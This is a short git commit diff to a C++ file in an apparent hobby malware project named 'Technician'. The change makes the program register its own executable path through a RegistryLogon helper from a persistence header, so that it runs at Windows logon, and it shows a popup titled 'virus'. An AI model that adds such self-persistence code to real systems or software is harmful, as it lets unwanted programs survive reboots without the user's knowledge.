e457bbe98dd8ffcc81e89e08d527f13516b4f997
Ben <94129183+benalaluf@users.noreply.github.com>
2025-07-01 11:09:27 +0300

    Update: add self to RegLogon

--- Technician/main.cpp
+++ Technician/main.cpp
@@ -5,11 +5,15 @@
 #include "Presistence.h"
 
 
-int main() {
+int main(int argc, char* argv[]) {
     PopUp("MANAGMENT PROGRAM IS UP!", "virus");
     
-    LPCSTR path = "$HOME/Technician.exe";
+    LPCSTR path = argv[0];
+    std::cout << argv[0];
     SIZE_T pathLength = strlen(path) + 1;
+
     RegistryLogon(path, pathLength);
+
+    return 0;
     
 }
